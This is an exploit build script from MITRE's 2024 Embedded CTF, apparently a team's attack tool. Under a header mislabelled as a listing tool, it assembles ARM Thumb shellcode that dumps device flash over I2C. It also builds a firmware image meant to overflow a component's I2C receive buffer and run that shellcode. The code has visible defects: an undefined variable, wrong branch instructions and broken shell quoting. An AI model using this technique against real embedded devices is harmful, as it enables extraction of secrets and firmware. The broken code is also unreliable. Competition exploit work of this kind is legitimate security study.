# @file list_tool.py
# @author Frederich Stine
# @brief host tool for listing installed components
# @date 2024
#
# This source file is part of an example system for MITRE's 2024 Embedded CTF (eCTF).
# This code is being provided only for educational purposes for the 2024 MITRE eCTF
# competition, and may not meet MITRE standards for quality. Use this code at your
# own risk!
#
# @copyright Copyright (c) 2024 The MITRE Corporation

import argparse
import os
import subprocess
import sys

from pwn import *


# returns the shellcode to run on the component
# this shellcode by default dumps the contents of flash to the uart
def construct_shellcode():
    # address we will read from
    start_dump_addr = 0x1000e000
    # amount of bytes we will print out
    dump_length = 0x00038000

    i2c_base = 0x4001e000
    i2c_status = i2c_base + 0x4
    i2c_flags0 = i2c_base + 0x8
    i2c_fifo = i2c_base + 0x2c

    flags_rd_addr_match = 1 << 22
    flags_tx_lockout = 1 << 15

    reg_write = f'''
        nop
        ldr r0, ={hex(start_dump_addr)}
        ldr r1, ={hex(start_dump_addr + dump_length)}
        ldr r2, ={hex(i2c_status)}
        ldr r3, ={hex(i2c_flags0)}
        ldr r4, ={hex(i2c_fifo)}
        ldr r5, ={hex(flags_rd_addr_match)}
        ldr r6, ={hex(flags_tx_lockout)}

        loop:

        i2c_wait_transaction_start:
        @ load flags in r7, and test if transaction has started
        ldr r7, [r3]
        and r7, r7, r5
        cmp r7, #0
        beq i2c_wait_transaction_start

        @ at this point transaction has started
        @ clear rd transaction start bit
        str r5, [r3]

        @ clear tx lockout
        str r6, [r3]

        @ r7 will be a counter of number of bytes written in transaction
        mov r7, #0

        transaction_loop:
        wait_fifo_not_full:
        @ first wait until fifo is not full
        @ load status into r8
        ldr r8, [r2]
        @ get tx fifo is full bit
        and r8, r8, #0x10
        @ if bit was set, wait until not set
        cmp r8, #0
        bne wait_fifo_not_full

        @ load from memory and write to fifo
        ldrb r9, [r0]
        strb r9, [r4]

        @ incrament next byte to send pointer
        add r0, r0, #1

        @ incrament transaction counter
        add r7, r7, #1

        @ continue transaction if less than 256 bytes have been written
        cmp r7, #256
        bl transaction_loop

        @ transaction done, if there is still more bytes to send, wait for next transaction
        cmp r0, r1
        bl loop

        nop
    '''

    shellcode = asm(reg_write, arch="thumb")
    assert len(shellcode) < 256

    print(shellcode)
    print(disasm(shellcode, arch='thumb'))

    return shellcode

PAGE_SIZE = 8192

APP_PAGES = 28
TOTAL_SIZE = APP_PAGES * PAGE_SIZE

"""
Package a device image for use with the bootstrapper
"""
def package_binary(bin_path, image_path):

    # Read input binaries
    with open(bin_path, "rb") as fp:
        bl_data = fp.read()

    # Pad bootloader to max size
    image_bl_pad_len = TOTAL_SIZE - len(bl_data)
    image_bl_padding = b"\xff" * image_bl_pad_len
    image_bl_data = bl_data + image_bl_padding

    # Write output binary
    with open(image_path, "wb") as fp:
        fp.write(image_bl_data)

def build(args):
    # cd to directory of this script
    dir = os.path.dirname(os.path.realpath(sys.argv[0]))
    os.chdir(dir)

    shellcode = construct_shellcode()
    # shellcode in the form of array notation
    shellcode_arr = '[' + ','.join(str(byte) for byte in shellcode) + ']'
    print(shellcode_arr)

    with open("application_processor/inc/ectf_params.h", "w") as fh:
        fh.write("#ifndef __ECTF_PARAMS__\n")
        fh.write("#define __ECTF_PARAMS__\n")
        fh.write(f"#define AP_PIN \"123456\"\n")
        fh.write(f"#define AP_TOKEN \"1234567890abcdef\"\n")
        # first id in this list will be id to pwn
        fh.write(f"#define COMPONENT_IDS \"{args.component}, 0x11111126\"\n")
        fh.write(f"#define COMPONENT_CNT 2\n")
        fh.write(f"#define AP_BOOT_MSG \"hi\"\n")
        fh.write("#endif\n")

    output_name = args.output
    output_dir = os.path.abspath(output_dir)
    output_elf = f"{output_name}.elf"
    output_bin = f"{output_name}.bin"
    output_img = f"{output_name}.img"

    if os.path.exists(output_elf):
        os.remove(output_elf)
    if os.path.exists(output_bin):
        os.remove(output_bin)
    if os.path.exists(output_img):
        os.remove(output_img)

    os.environ['RECV_DONE_ADDRESS'] = args.done_address
    os.environ['WRITE_LEN'] = args.write_len
    os.environ['SHELLCODE'] = shellcode_arr

    output = subprocess.check_output([
        '/bin/sh',
        f'pwd && nix-shell --command ""cd application_processor && make clean && make && make release && cp build/max78000.elf {output_elf} && cp build/max78000.bin {output_bin}'
    ])

    if not os.path.exists(output_bin):
        print("Error: tool did not build properly")
        exit(1)

    print("Built application processor")

    print("Packaging binary")
    package_binary(output_bin, output_img)
    print("Binary packaged")


# Main function
def main():
    parser = argparse.ArgumentParser(
        prog="b01lers i2c supply chain build",
        description="exploit the bug in the component i2c handler on the supply chain scenario",
    )

    parser.add_argument(
        "-o", "--output", required=True, help="Output file of built image"
    )

    parser.add_argument(
        "-c", "--component", required=True, help="Component ID of component to pwn"
    )

    parser.add_argument(
        "-r", "--done-address", default="0x20000b34", help="Address of the recieve done buffer (on reference design this is 0x20000b34)"
    )

    parser.add_argument(
        "-l", "--write-len", default="0x1000", help="Number of bytes to overflow i2c with"
    )

    args = parser.parse_args()

    build(args)


if __name__ == "__main__":
    main()

